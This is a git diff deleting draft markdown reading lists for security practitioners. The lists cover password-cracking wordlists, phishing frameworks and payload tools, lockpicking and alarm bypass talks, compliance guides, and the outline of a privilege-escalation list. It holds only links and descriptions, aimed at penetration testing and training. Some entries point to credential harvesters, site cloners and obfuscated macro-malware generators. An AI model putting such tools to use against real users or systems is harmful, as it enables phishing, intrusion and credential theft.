-[Generating Wordlists](http://netsec.ws/?p=457)
-
-[Creating Wordlists with Crunch](http://adaywithtape.blogspot.com/2011/05/creating-wordlists-with-crunch-v30.html)
-
-
-### <a name="wordlists">Wordlists</a>
-[Crackstation?s Password Cracking Dictionary 1.5b words](https://crackstation.net/buy-crackstation-wordlist-password-cracking-dictionary.htm)
-* HIGHLY recommended
-
-[WPA/WPA2 Dictionaries](https://wifi0wn.wordpress.com/wepwpawpa2-cracking-dictionary/)
-
-[SkullSecurity Password lists](https://wiki.skullsecurity.org/Passwords)
-
-[CrackStation?s Password Cracking Dictionary](https://crackstation.net/buy-crackstation-wordlist-password-cracking-dictionary.htm)
-
-[Crack Me if You Can - Defcon 2010](http://contest-2010.korelogic.com/wordlists.html)
-
-[BEWGor](https://github.com/berzerk0/BEWGor)
-* Bull's Eye Wordlist Generator
-
-[Probable-Wordlists](https://github.com/berzerk0/Probable-Wordlists)
-* Wordlists sorted by probability originally created for password generation and testing
-
-[BEWGor](https://github.com/berzerk0/BEWGor)
-* Bull's Eye Wordlist Generator
-
-[Probable-Wordlists](https://github.com/berzerk0/Probable-Wordlists)
-* Wordlists sorted by probability originally created for password generation and testing
-
-
-
-
-
-
-
-### Talks & Presentations
-
-[Cracking Corporate Passwords Exploiting Password Policy Weaknesses - Minga Rick Redm - Derbycon3](https://www.youtube.com/watch?v=qR-qRUbeKAo)
-
-
-
-
-### <a name="papers">Papers</a>
-
-[Optimizing computation of Hash Algorithms as an attacker](https://hashcat.net/events/p13/js-ocohaaaa.pdf)
-
-[Attacking NTLM with Precomputed Hashtables](http://uninformed.org/?v=all&a=13&t=sumry)
-* Breaking encrypted passwords has been of interest to hackers for a long time, and protecting them has always been one of the biggest security problems operating systems have faced, with Microsoft's Windows being no exception. Due to errors in the design of the password encryption scheme, especially in the LanMan(LM) scheme, Windows has a bad track in this field of information security. Especially in the last couple of years, where the outdated DES encryption algorithm that LanMan is based on faced more and more processing power in the average household, combined with ever increasing harddisk size, made it crystal clear that LanMan nowadays is not just outdated, but even antiquated. 
-
-[Website Dedicated to Password Research](http://www.passwordresearch.com/papers/pubindex.html)
-* A core objective of the Password Research Institute is to improve the industry awareness of existing authentication research. Many valuable solutions for the problems associated with authentication have gone unnoticed by the people interested in, or responsible for, authentication security. This project will compile and share a comprehensive, but moderated, index of password and authentication related research papers. We aim to share the details of useful papers, provide access to the papers, and encourage collaboration between authors and other security professionals.
-
-
-
-
-
-
-
-
-
-
diff --git a/Draft/Phishing.md b/Draft/Phishing.md
deleted file mode 100755
index 8006906..0000000
--- a/Draft/Phishing.md
+++ /dev/null
@@ -1,170 +0,0 @@
-##Phishing
-
-
-
-TOC
-
-* [General](#general)
-* [Phishing Frameworks](#framework)
-* [Phishing Guides](#guides)
-* [Phishing Writeups](#writeup)
-
-
-
-
-
-### Cull
-
-[Client Identification Mechanisms](http://www.chromium.org/Home/chromium-security/client-identification-mechanisms)
-#### End cull
-
-
-
-
-
-
-
-
-
-
-
-
-------------------
-###<a name="general>General</a>
-* General
-	* [Phishing - wikipedia](http://www.en.wikipedia.org/wiki/Phishing):
-		* ?Phishing is the attempt to acquire sensitive information such as usernames, passwords, and credit card details (and sometimes, indirectly, money) by masquerading as a trustworthy entity in an electronic communication.?
-	* [Post exploitation trick - Phish users for creds on domains, from their own box](https://enigma0x3.wordpress.com/2015/01/21/phishing-for-credentials-if-you-want-it-just-ask/)
-* Articles/Blogposts
-	* [Top 10 Email Subjects for Company Phishing Attacks](http://www.pandasecurity.com/mediacenter/security/top-10-email-subjects-phishing-attacks/)
-	* [Some Tips for Legitimate Senders to Avoid False Positives - Apache SpamAssassin](https://wiki.apache.org/spamassassin/AvoidingFpsForSenders)
-	* [Email Delivery ? What Pen Testers Should Know - cs](https://blog.cobaltstrike.com/2013/10/03/email-delivery-what-pen-testers-should-know/)
-	* [What?s the go-to phishing technique or exploit? - cs](https://blog.cobaltstrike.com/2014/12/17/whats-the-go-to-phishing-technique-or-exploit/)
-	* [Phishing, Lateral Movement, SCADA, OH MY!](https://web.archive.org/web/20160408193653/http://www.idzer0.com/?p=210)
-* Papers
-	* [Tab Napping - Phishing](http://www.exploit-db.com/papers/13950/)
-	* [Skeleton in the closet. MS Office vulnerability you didn?t know about](https://embedi.com/blog/skeleton-closet-ms-office-vulnerability-you-didnt-know-about)
-		* Microsoft Equation Editor Exploit writeup
-	* [MetaPhish Paper](https://www.blackhat.com/presentations/bh-usa-09/SMITH_VAL/BHUSA09-Smith-MetaPhish-PAPER.pdf)
-* Writeups
-	* [How do I phish? ? Advanced Email Phishing Tactics - Pentest Geek](https://www.pentestgeek.com/2013/01/30/how-do-i-phish-advanced-email-phishing-tactics/)
-	* [Real World Phishing Techniques - Honeynet Project](http://www.honeynet.org/book/export/html/89)
-
-
-
-
-
-
-----------
-###<a name="documentation"> Documentation
-* [Sender Policy Framework - Wikipedia](https://en.wikipedia.org/wiki/Sender_Policy_Framework)
-* [DomainKeys Identified Mail - Wikipedia](https://en.wikipedia.org/wiki/DomainKeys_Identified_Mail)
-* [DMARC - Wikipedia](https://en.wikipedia.org/wiki/DMARC)
-* [Domain-based Message Authentication, Reporting, and Conformance (DMARC) - RFC7489](https://tools.ietf.org/html/rfc7489)
-* [SPF, DKIM, and DMARC Demystified - McAfee](https://jira.sakaiproject.org/secure/attachment/43722/sb-spf-dkim-dmarc-demystified.pdf)
-* [Add commands to your presentation with action buttons](https://support.office.com/en-us/article/Add-commands-to-your-presentation-with-action-buttons-7db2c0f8-5424-4780-93cb-8ac2b6b5f6ce)
-	* Add commands to your presentation with action buttons
-* [SMTP Strict Transport Security](https://lwn.net/Articles/684462/)
-
-
-
-----------
-###<a name="framework">Phishing Frameworks:</a>
-* [Phishing Frenzy](http://www.phishingfrenzy.com/)
-	* Phishing Frenzy is an Open Source Ruby on Rails application that is leveraged by penetration testers to manage email phishing campaigns. The goal of the project is to streamline the phishing process while still providing clients the best realistic phishing campaign possible. This goal is obtainable through campaign management, template reuse, statistical generation, and other features the Frenzy has to offer.
-* [sptoolkit](https://github.com/sptoolkit/sptoolkit)
-	* Simple Phishing Toolkit is a super easy to install and use phishing framework built to help Information Security professionals find human vulnerabilities
-* [sptoolkit-rebirth](https://github.com/simplephishingtoolkit/sptoolkit-rebirth)
-	* sptoolkit hasn't been actively developed for two years. As it stands, it's a brilliant peice of software, and the original developers are pretty damn awesome for creating it. But we'd like to go further, and bring sptoolkit up to date. We've tried contacting the developers, but to no avail. We're taking matters into our own hands now.
-* [KingPhisher](https://github.com/securestate/king-phisher)
-	* King Phisher is a tool for testing and promoting user awareness by simulating real world phishing attacks. It features an easy to use, yet very flexible architecture allowing full control over both emails and server content. King Phisher can be used to run campaigns ranging from simple awareness training to more complicated scenarios in which user aware content is served for harvesting credentials.
-* [Gophish](https://github.com/gophish/gophish)
-	* Gophish is an open-source phishing toolkit designed for businesses and penetration testers. It provides the ability to quickly and easily setup and execute phishing engagements and security awareness training.
-	* [gophish documentation](https://getgophish.com/documentation/)
-* [TackleBox](https://github.com/trailofbits/tacklebox)
-* [king-phisher](https://github.com/securestate/king-phisher)
-	*  Phishing Campaign Toolkit
-
-
-------------------
-### Tools
-* Cloning
-	* [Cooper](https://github.com/chrismaddalena/Cooper)
-		* Cooper simplifies the process of cloning a target website or email for use in a phishing campaign. Just find a URL or download the raw contents of an email you want to use and feed it to Cooper. Cooper will clone the content and then automatically prepare it for use in your campaign. Scripts, images, and CSS can be modified to use direct links instead of relative links, links are changed to point to your phishing server, and forms are updated to send data to you -- all in a matter of seconds. Cooper is cross-platform and should work with MacOS, Linux, and Windows.
-* Domains
-	* [CatMyFish](https://github.com/Mr-Un1k0d3r/CatMyFish)
-		* Search for categorized domain that can be used during red teaming engagement. Perfect to setup whitelisted domain for your Cobalt Strike beacon C&C.  It relies on expireddomains.net to obtain a list of expired domains. The domain availability is validated using checkdomain.com
-	* [CatPhish](https://github.com/ring0lab/catphish)
-		* Generate similar-looking domains for phishing attacks. Check expired domains and their categorized domain status to evade proxy categorization. Whitelisted domains are perfect for your C2 servers.
-* Email Harvesting
-	* [PhishBait](https://github.com/hack1thu7ch/PhishBait)
-		* Tools for harvesting email addresses for phishing attacks
-	* [Email Address Harvesting for Phishing](http://www.shortbus.ninja/email-address-harvesting-for-phishing-attacks/)
-* Frameworks
-	* [Cartero](https://github.com/Section9Labs/Cartero)
-		* Cartero is a modular project divided into commands that perform independent tasks (i.e. Mailer, Cloner, Listener, AdminConsole, etc...). In addition each sub-command has repeatable configuration options to configure and automate your work.
-	* [FiercePhish](https://github.com/Raikia/FiercePhish)
-		* FiercePhish is a full-fledged phishing framework to manage all phishing engagements. It allows you to track separate phishing campaigns, schedule sending of emails, and much more
-* Payloads
-	* [Demiguise](https://github.com/nccgroup/demiguise)
-		* The aim of this project is to generate .html files that contain an encrypted HTA file. The idea is that when your target visits the page, the key is fetched and the HTA is decrypted dynamically within the browser and pushed directly to the user.
-	* [morphHTA - Morphing Cobalt Strike's evil.HTA](https://github.com/vysec/morphHTA)
-	* * [Social-Engineering-Payloads - t3ntman](https://github.com/t3ntman/Social-Engineering-Payloads)
-* Recon
-	* [hackability](https://github.com/PortSwigger/hackability)
-		* Rendering Engine Hackability Probe performs a variety of tests to discover what the unknown rendering engine supports. To use it simply extract it to your web server and visit the url in the rendering engine you want to test. The more successful probes you get the more likely the target engine is vulnerable to attack.
-* Templates
-	* [SimplyTemplate](https://github.com/killswitch-GUI/SimplyTemplate)
-		* Phishing Template Generation Made Easy. The goal of this project was to hopefully speed up Phishing Template Gen as well as an easy way to ensure accuracy of your templates. Currently my standard Method of delivering emails is the Spear Phish in Cobalt strike so you will see proper settings for that by defaul
-
-
-------------------
-### Microsoft Outlook/Exchange Stuff
-* [Exchange Versions, Builds & Dates](https://eightwone.com/references/versions-builds-dates/)
-* [Outlook and Exchange for the Bad Guys Nick Landers - Derbycon6](https://www.youtube.com/watch?v=cVhc9VOK5MY)
-* [Microsoft Support and Recovery Assistant for Office 365](https://testconnectivity.microsoft.com/)
-* Bypass
-	* [How to bypass Web-Proxy Filtering](https://www.blackhillsinfosec.com/?p=5831)
-* Outlook Rules
-	* [Malicious Outlook Rules](https://silentbreaksecurity.com/malicious-outlook-rules/)
-	* [EXE-less Malicious Outlook Rules - BHIS](https://www.blackhillsinfosec.com/?p=5544)
-* Tools
-	* [MailRaider](https://github.com/xorrior/EmailRaider)
-	* [Phishery](https://github.com/ryhanson/phishery)
-		* An SSL Enabled Basic Auth Credential Harvester with a Word Document Template URL Injector		* MailRaider is a tool that can be used to browse/search a user's Outlook folders as well as send phishing emails internally using their Outlook client.
-
-
-
-------------------
-### MS Office
-* [Next Gen Office Malware v2.0 - Greg Linares Dagmar Knechtel - Hushcon17](https://prezi.com/view/eZ3CSNMxPMOfIWEHwTje/)
-* DDE
-	* * [Exploiting Office native functionality: Word DDE edition](https://www.securityforrealpeople.com/2017/10/exploiting-office-native-functionality.html)
-* Macros
-	* [Malicious Macro Generator](https://github.com/Mr-Un1k0d3r/MaliciousMacroGenerator)
-		* Simple utility design to generate obfuscated macro that also include a AV / Sandboxes escape mechanism.
-	* [macphish](https://github.com/cldrn/macphish)
-		* Office for Mac Macro Payload Generator 
-	* [SimplyTemplate](https://github.com/killswitch-GUI/SimplyTemplate)
-		* Phishing Template Generation Made Easy. The goal of this project was to hopefully speed up Phishing Template Gen as well as an easy way to ensure accuracy of your templates. Currently my standard Method of delivering emails is the Spear Phish in Cobalt strike so you will see proper settings for that by default.
-	* [RobustPentestMacro](https://github.com/mgeeky/RobustPentestMacro)
-		* This is a rich-featured Visual Basic macro code for use during Penetration Testing assignments, implementing various advanced post-exploitation techniques.
-	* [Generate MS Office Macro Malware Script](https://github.com/enigma0x3/Generate-Macro/blob/master/Generate-Macro.ps1)
-		* Standalone Powershell script that will generate a malicious Microsoft Office document with a specified payload and persistence method
-* [InfoPhish](https://github.com/InfoPhish/InfoPhish)
-* [luckystrike](https://github.com/Shellntel/luckystrike)
-	* A PowerShell based utility for the creation of malicious Office macro documents.
-* [VBad](https://github.com/Pepitoh/VBad)
-	* VBad is fully customizable VBA Obfuscation Tool combined with an MS Office document generator. It aims to help Red & Blue team for attack or defense.
-------------------
-### Talks/Presentations
-* [Three Years of Phishing - What We've Learned - Mike Morabito](http://www.irongeek.com/i.php?page=videos/centralohioinfosec2015/tech105-three-years-of-phishing-what-weve-learned-mike-morabito)
-	* Cardinal Health has been aggressively testing and training users to recognize and avoid phishing emails. This presentation covers 3 years of lessons learned from over 18,000 employees tested, 150,000 individual phishes sent, 5 complaints, thousands of positive comments, and a dozen happy executives. Learn from actual phishing templates what works well, doesn,t work at all, and why? See efficient templates for education and reporting results.
-* [Ichthyology: Phishing as a Science - BH USA 2017](https://www.youtube.com/watch?v=Z20XNp-luNA&app=desktop)
-* [Modern Evasion Techniques Jason Lang - Derbycon7](https://www.irongeek.com/i.php?page=videos/derbycon7/t110-modern-evasion-techniques-jason-lang)
-	* As pentesters, we are often in need of working around security controls. In this talk, we will reveal ways that we bypass in-line network defenses, spam filters (in line and cloud based), as well as current endpoint solutions. Some techniques are old, some are new, but all work in helping to get a foothold established. Defenders: might want to come to this one.
-* [Phishing Like The Pros - Luis ?Connection? Santana - Derbycon 2013](https://www.irongeek.com/i.php?page=videos/derbycon3/1305-phishing-like-the-pros-luis-connection-santana)
-	* This talk will discuss phishing techniques used by professionals during phishing campaigns and introduce ?PhishPoll?, a PHP-based phishing framework for creating, managing, and tracking phishing campaigns.
-* [MetaPhish - Valsmith, Colin Ames, and David Kerb - DEF CON 17](https://www.youtube.com/watch?v=3DYOMkkTK4A)
-
-
diff --git a/Draft/Phyiscal Security.md b/Draft/Phyiscal Security.md
deleted file mode 100755
index 3af4545..0000000
--- a/Draft/Phyiscal Security.md	
+++ /dev/null
@@ -1,238 +0,0 @@
-# Physical Security
-
-### ToC
-* [General](#general)
-	* [Articles/Blogposts](#articles)
-	* [Videos/Talks](#videos)
-	* [Tools](#tools)
-	* [Papers](#papers)
-* [Tamper Evident Related](#tamper)
-* [Lockpicking](#lockpicking)
-	* [Guides/Techniques](#guides)
-	* [Videos/Talks](#talks)
-	* [Books](#books)
-	* [Sites/Organizations](#sites)
-* [Alarm Systems](#alarm)
-* [Doors](#doors)
-
-
-
-#### Sort
-[Home Alone with localhost - Automating Home Defense - Chris Littlebury Defcon22](https://www.youtube.com/watch?v=9Tbft190x3Q)
-
-[Door Control Systems: An Examination of Lines of Attack](https://www.nccgroup.com/en/blog/2013/09/door-control-systems-an-examination-of-lines-of-attack/)
-[Physical Home Security Options - DiabloHorn](https://diablohorn.wordpress.com/2014/07/13/physical-home-security-options/#more-984)
-
-[Hacking things by touching them - armadillo](https://www.armadillophone.com/blog/2017/08/27/hacking-things-by-touching-them)
-
-[zoneminder](https://www.zoneminder.com/)
-* A full-featured, open source, state-of-the-art video surveillance software system.
-
-
-#### End Sort
-
-
-
------------------------
-### <a name="general"></a>General
-
-
-
------------------------
-### <a name="articles"></a>Articles/Blogposts
-
-[Physical Security - Centre for the Protection of National Infrastructure - UK](https://www.cpni.gov.uk/physical-security)
-
-
-
-
-
-
-
-
------------------------
-### <a name="videos"></a>Videos/Talks
-
-[Physical Penetration Testing You Keep a Knockin But You Cant Come In Phil Grime](https://www.youtube.com/watch?v=_0gz_iWoMT0)
-
-[Home Insecurity: No Alarms, False Alarms, and SIGINT](https://media.defcon.org/DEF%20CON%2022/DEF%20CON%2022%20presentations/Logan%20Lamb/DEFCON-22-Logan-Lamb-HOME-INSECURITY-NO-ALARMS-FALSE-ALARMS-AND-SIGINT-WP.pdf)
-* The market share of home security systems has substantially increased as vendors incorporate more desirable features: intrusion detection, automation, wireless, and LCD touch panel controls. Wireless connectivity allows vendors to manufacture cheaper, more featureful products that require little to no home modification to install.  Consumer win, since adding devices is easier. The result: an ostensibly more secure, convenient, and connected home for a larger number of citizens. Sadly, this hypothesis is flawed; the idea of covering a home with more security sensors does not translate into a more secure home.  Additionally, the number of homes using these vulnerable systems is large, and the growth rate is increasing producing a even larger problem. In this paper, we will demonstrate a generalized approach for compromising three systems: ADT, the largest home security dealer in North America; Honeywell, one of the largest manufacturers of security devices; and Vivint, a top 5 security dealer.  We will suppress alarms, create false alarms, and collect artifacts that facilitate tracking the movements of individuals in their homes
-
-[Physical Security: From Locks to Dox - Jess Hires](http://www.irongeek.com/i.php?page=videos/derbycon4/t540-physical-security-from-locks-to-dox-jess-hires)
-* This talk is an introduction to Physical Penetration Testing. I briefly cover the Penetration Testing Methodology from a Physical Security perspective, but the talk is mostly oriented around the analysis and exploitation phases. Various attacks will be covered, from lock picking and bypass to safe cracking. No prior experience with lock picking or physical security is required, I will start with the basics and work up to advanced topics.
-
-
-[Defcon 19: DIY Non-Destructive-Entry](https://www.youtube.com/watch?v=ChbyaXBKNY8)
-
-
-
-### <a name="tools"></a>Tools
-
-
-### <a name="papers"></a>Papers
-
-
------------------------
-### <a name="tamper"></a>Tamper Evident Related
-
-[What does tamper-evident mean?](https://www.healthcarepackaging.com/article/package-design/structural/what-does-tamper-evident-mean)
-
-[Introduction to Tamper Evident Devices -DEFCON 19 ](https://www.youtube.com/watch?v=SIQml3MBJoE&spfreload=10)
-
-[Tamper-evident technology - Wikipedia](https://en.wikipedia.org/wiki/Tamper-evident_technology)
-
-[Tamper resistance and  hardware security](https://www.cl.cam.ac.uk/~sps32/PartII_030214.pdf)
-
-[How to Steal a Nuclear Warhead Without Voiding Your XBox Warranty (paper)](https://www.scribd.com/document/47334072/How-to-Steal-a-Nuclear-Warhead-Without-Voiding-Your-XBox-Warranty-paper)
-
-
-
-
-
-
------------------------
-## <a name="lockpicking"></a>Lock Picking
-
-
-### General Information
-
-[Various types of locks](https://securitysnobs.com/Types-Of-Locks.html)
-
-[Wikipedia on Lockpicking](https://en.wikipedia.org/wiki/Lock_picking)
-
-
-
------------------------
-### <a name="guides"></a>Guides/Techniques
-
-[Newbies guide to picking safes](http://cybergibbons.com/lockpicking-2/a-newbies-guide-to-safes/)
-
-[Attack the Key, Own the Lock - Defcon18](https://www.youtube.com/watch?v=_-PqzkoQQ7s)
-
-[Key Impressioning by Jos Weyers - Defcon 19](https://www.youtube.com/watch?v=s8aQSxXoLFk)
-
-[Safecracking for the computer scientist*](http://www.crypto.com/papers/safelocks.pdf)
-
-[Jos Weyers – Lock Impressioning](https://www.youtube.com/watch?v=JcNc1BVaCE0)
-
-[CIA Lock Picking [Field Operative Training Manual]](https://archive.org/details/pdfy-eGBVTYko5TUI5P_B)
-
-[Lock Picking Course - LockLab](https://lock-lab.com/locklab-university/lock-picking-course-2/)
-
-[A newbies guide to safes, both opening and using](https://www.reddit.com/r/WhatsInThisThing/comments/1gm6uk/a_newbies_guide_to_safes_both_opening_and_using/)
-
-
-
------------------------
-### <a name="talks"></a>Videos/Talks
-
-
-[Safe to Armed in Seconds - Deviant Ollam - DEF CON 19](https://www.youtube.com/watch?v=3SVMT_zNlgA)
-
-[This Key is Your Key, This Key is My Key - Howard Payne & Deviant Ollam](https://www.youtube.com/watch?v=a9b9IYqsb_U)
-
-[I'll Let Myself In Tactics of Physical Pentesters - Deviant Ollam -B-sides Orlando 2017](https://www.youtube.com/watch?v=Rctzi66kCX4)
-
-[Introduction to Lockpicking and Physical Security - DEFCON 13](https://www.youtube.com/watch?v=JupQ3BpKGYg)
-
-[Lockpicking by Deviant Ollam](http://deviating.net/lockpicking/videos.html)
-* Glorious set of videos and instructional information. Must watch.
-
-[Electronic Locks - are really secure?!](https://www.youtube.com/watch?v=ZK0MfE7o4HU)
-* Many people are familiar with the ways in which mechanical locks can be attacked, compromised, and bypassed. Indeed, the hands-on workshops and the availability of pick tools at the Lockpick Village is an enduring part of the fun at DeepSec and other popular security conferences around the world. Often, attendees will ask questions like, "So, this is really great... but what if someone is using an electronic lock? How hard is it to open the door, then?" Unfortunately, due to time and space constraints, our answer is typically, "Well... that's a very complicated question. Sometimes they're good, and sometimes they're weak." We often promise greater detail another day, another time... but until now that time has not come. Finally now, however, TOOOL will describe some of the most popular electronic locks and show examples of how they can sometimes be attacked.
-
-[Distinguishing Lockpicks: Raking vs Lifting vs Jiggling and More - Deviant Ollam](https://www.youtube.com/watch?v=e07VRxJ01Fs)
-
-[Mastering Master Keys - Deviant Ollam - HOPE Number 9](https://www.youtube.com/watch?v=aVPSaKLKHd4)
-
-[!$@$Lockpicking & Physical security - Deviant Ollam - Best lockpicking course abc tutorial diy](https://www.youtube.com/watch?v=j6WCe-4XQ3Q)
-
-[Lockpicking, Safecracking, & More by Deviant Ollam & renderman at ShmooCon 3](https://www.youtube.com/watch?v=WTgUVhjts2U)
-* For the first time on the same stage together at ShmooCon, renderman and i give a funny and informative presentation about lockpicking using much of my traditional material as well as a whole load of new content that my favorite Canadian demonstrates. In addition to his all-around general badassery, renderman even opened up a locked safe on stage... one that he had never seen before and was simply given by an audience member. That took fucking balls.
-
-["Lockpicking in Real Life versus on the Screen" - The Eleventh HOPE (2016)](https://www.youtube.com/watch?v=mjBSocgMCPU)
-* We all know that Hollywood has a difficult time portraying hackers accurately. This quirk often extends to the realm of showing lockpicking in movies and on TV. But sometimes, a film gets it really right! This talk is both an introduction to lockpicking (in case you still need to learn) as well as a walk through some of the best - and some of the worst - scenes of lockpicking that have ever been seen by movie and TV audiences. Learn about how to be a better lockpicker and a better filmmaker... all at the same time!
-
-[Electronic Safe Fail](http://www.irongeek.com/i.php?page=videos/centralohioinfosec2015/tech204-electronic-safe-fail-jeff-popio)
-* Commonly safes are used in IT to secure backup tapes, certificate roots, and other sensitive material. This talk will demonstrate that many of the safes used to secure these sensitive materials are ineffective. Today there are many varieties of electronic safes that utilize a VERY weak mechanism to physically lock the safe. In many cases there are ways to open the safe in less than a minute that leaves no evidence behind. (Sometimes only a few seconds) This talk will cover my experience discovering the flaw and dealing with a safe vendor to issue a fix, then discovering the inadequacies of the fix itself and vendor's continuing ignorance of the problem with most electronic locks. Fixing these problems can be relatively easy. There will be general instruction on how to fix the problems and what needs to be done by the vendors to make safes well... safer."
-
-[Lockpicking how to video using a cut-away lock](http://www.youtube.com/watch?v=LSt0RxkA_f8)
-
-[Distinguishing Lockpicks: Raking vs Lifting vs Jiggling and More - Deviant Ollam](https://www.youtube.com/watch?v=e07VRxJ01Fs)
-
-
-
-
-
-#### <a name="alarm"></a>Alarm Systems
-
-[Ways your alarm system can fail - abak Javadi Keith Howell](https://www.youtube.com/watch?v=g4-B7d3ZQUA)
-
-[Alarmed About Your Alarm System Yet - Keith Howell, Babak Javadi](https://www.youtube.com/watch?v=5rnkhqEj_Po)
-
-[Hacking Wireless Home Security Systems by Eric Escobar - BSides Manchester2017](https://www.youtube.com/watch?v=kERUpg5YMis&index=12&list=PLcgqQkap1lNrOBNCXqpPqpPAqckxv0XhP)
-
-[Home Insecurity: No Alarms, False Alarms, and SIGINT](https://media.defcon.org/DEF%20CON%2022/DEF%20CON%2022%20presentations/Logan%20Lamb/DEFCON-22-Logan-Lamb-HOME-INSECURITY-NO-ALARMS-FALSE-ALARMS-AND-SIGINT-WP.pdf)
-
-[Let's get physical: Breaking home security systems & bypassing controls - Black Hat USA 2013](https://www.youtube.com/watch?v=O4ya3z-PCQs)
-
-
-
-
-#### <a name="doors"></a>Doors
-
-[What Does The Perfect Door Or Padlock Look Like? - Deviant Ollam - BruCON 0x08](https://www.youtube.com/watch?v=4skSBwBBI-s)
-
-[The Search for the Perfect Door - Deviant Ollam - Shakacon](https://www.youtube.com/watch?v=4YYvBLAF4T8)
-* You have spent lots of money on a high-grade, pick-resistant, ANSI-rated lock for your door. Your vendor has assured you how it will resist attack and how difficult it would be for someone to copy your key. Maybe they’re right. But… the bulk of attacks that both penetration testers and also criminals attempt against doors have little or nothing to do with the lock itself! This talk will be a hard-hitting exploration (full of photo and video examples) of the ways in which your door — the most fundamental part of your physical security — can possibly be thwarted by someone attempting illicit entry. The scary problems will be immediately followed by simple solutions that are instantly implementable and usually very within-budget. You, too, can have a near-perfect door… if you’re willing to learn and understand the problems that all doors tend to have. 
-
-[Physical Security - Everything That's Wrong With Your Typical Door - Deviant Ollam - SANS Webcast](https://www.youtube.com/watch?v=raBMFqZRB0s&t=&feature=youtu.be&app=desktop)
-
-[Door Control Systems: An Examination of Lines of Attack](https://www.nccgroup.com/en/blog/2013/09/door-control-systems-an-examination-of-lines-of-attack/)
-
-
-
-
-
-
-
-
-
-
-
-
-
------------------------
-### <a name="books"></a>Books
-
-[Locksport Primer](http://pdf.textfiles.com/security/lsiguide.pdf)
-
-[Academic book on Locks](https://www.goodreads.com/book/show/525753.Locks_Safes_and_Security)
-
-[MIT Guide to Lockpicking](http://www.capricorn.org/~akira/home/lockpick/)
-
-
-
-
-
-
-
-
-
-
-
------------------------
-### <a name="sites"></a>Sites/Organizations
-
-[The Open Organization of Lockpickers](http://toool.us/)
-* The mission of the Open Organisation Of Lockpickers is to advance the general public knowledge about locks and lockpicking. By examining locks, safes, and other such hardware and by publicly discussing our findings we hope to strip away the mystery with which so many of these products are imbued.  The more that people know about lock technology, the better they are capable of understanding how and where certain weaknesses are present. This makes them well-equipped to participate in sportpicking endeavors and also helps them simply be better consumers in the marketplace, making decisions based on sound fact and research.
-
-[lockpicking101](http://www.lockpicking101.com/)
-* A community dedicated to the fun and ethical hobby of lock picking.
-
-[/r/lockpicking - Reddit Lockpicking Community](https://www.reddit.com/r/lockpicking)
-
-[keypicking.com](http://www.keypicking.com/)
-
-
-
diff --git a/Draft/Policy-Compliance.md b/Draft/Policy-Compliance.md
deleted file mode 100755
index dec7bc2..0000000
--- a/Draft/Policy-Compliance.md
+++ /dev/null
@@ -1,71 +0,0 @@
-## Policy & Compliance
-
-
-#### ToC
-
-* [General](#general)
-* [Talks & Presentations](#talks)
-* [Miscellaneous](#misc)
-* [Papers](#papers)
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-------------
-### <a name="General"></a>General
-
-[The Red Book: A Roadmap for Systems Security Research](http://www.red-book.eu/m/documents/syssec_red_book.pdf)
-
-[IT Law Wiki](http://itlaw.wikia.com/wiki/The_IT_Law_Wiki))
-
-
-------------
-### Guides
-
-[Technical Guide to Information Security Testing and Assessment - NIST-800-115](http://nvlpubs.nist.gov/nistpubs/Legacy/SP/nistspecialpublication800-115.pdf)
-
-[Security and Privacy Controls forFederal Information Systemsand Organizations - NIST-800-53](http://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-53r4.pdf)
-
-[NIST Cybersecurity Practice Guide, Securing Wireless Infusion Pumps in Healthcare Delivery Organizations](https://nccoe.nist.gov/projects/use-cases/medical-devices)
-* [SP 1800-8a: Executive Summary](https://nccoe.nist.gov/publication/draft/1800-8/VolA/)
-* [SP 1800-8b: Approach, Architecture, and Security Characteristics ](https://nccoe.nist.gov/publication/draft/1800-8/VolB/)
-* [SP 1800-8c: How-To Guides](https://nccoe.nist.gov/publication/draft/1800-8/VolC/)
-
-[SP 800-115: Technical Guide to Information Security Testing and Assessment](https://csrc.nist.gov/publications/detail/sp/800-115/final)
-* The purpose of this document is to assist organizations in planning and conducting technical information security tests and examinations, analyzing findings, and developing mitigation strategies. The guide provides practical recommendations for designing, implementing, and maintaining technical information security test and examination processes and procedures. These can be used for several purposes, such as finding vulnerabilities in a system or network and verifying compliance with a policy or other requirements. The guide is not intended to present a comprehensive information security testing and examination program but rather an overview of key elements of technical security testing and examination, with an emphasis on specific technical techniques, the benefits and limitations of each, and recommendations for their use. 
-
-[Security Assessment Guidelines for Financial Institutions](https://www.sans.org/reading-room/whitepapers/auditing/security-assessment-guidelines-financial-institutions-993)
-
-[Information Security Risk Assessment Guidelines - mass.gov](http://www.mass.gov/anf/research-and-tech/cyber-security/security-for-state-employees/risk-assessment/risk-assessment-guideline.html)
-
-
-
-
-------------
-### <a name="talks"></a>Talks & Presentations
-[The foundation is rotting and the basement is flooding: A deeper look at the implicit trust relationships in your organization](https://www.youtube.com/watch?v=nL64uj9Xm24)
-
-
-
-
-
-### <a name="papers"></a>Papers
-[A Survey of Insider Attack Detection Research - 2008](http://web.stanford.edu/class/cs259d/readings/Insider_survey.pdf)
-
-[The “Big Picture” of Insider IT Sabotage Across U.S. Critical Infrastructures](http://web.stanford.edu/class/cs259d/readings/Infrastructure.pdf)
-
-[An Overview of Threat and Risk Assessment](https://www.sans.org/reading-room/whitepapers/auditing/overview-threat-risk-assessment-76)
-
-
-
diff --git a/Draft/Privilege Escalation & Post-Exploitation.md b/Draft/Privilege Escalation & Post-Exploitation.md
deleted file mode 100755
index 023b3fe..0000000
--- a/Draft/Privilege Escalation & Post-Exploitation.md	
+++ /dev/null
@@ -1,873 +0,0 @@
- ## Privilege Escalation & Post-Exploitation
-
-
-* [General](#general)
-* [Linux Privilege Escalation](#linpriv)
-* [Windows Privilege Escalation](#winpriv)
-* [OS X lege Escalation](#osxpriv)
-* [Miscellaneous Privilege Escalation](#miscpriv)
-* [Powershell Stuff](#powershell-stuff)
-* [DLL Stuff](#dll)
-* [General Post Exploitation](#generalpost)
-* [Linux Post Exploitation](#linpost)
-* [OS X Post Exploitation](#osxpost)
-* [Windows Post Exploitation](#winpost)
-* [ActiveDirectory](#ad)
-* [Kerberos](#kerberos)
-* [Office Macros](#officemacro)
-* [Email/Exchange](#email)
-* [Grabbing Goodies](#grabbing)
-* [Gaining Awareness](#awareness)
-* [Persistence Techniques](#persistence)
-* [OS X Persistence](#osxpersist)
-* [Pivoting & Lateral movement](#pivot)
-* [Avoiding/Bypassing Anti-Virus/Whitelisting/Sandboxes/etc](#av)
-* [Containers & Docker](#docker)
-* [Payloads](#payloads)
-* [Code Injection](#inject)
-* [Papers](#papers)
-
-
-##### to do:
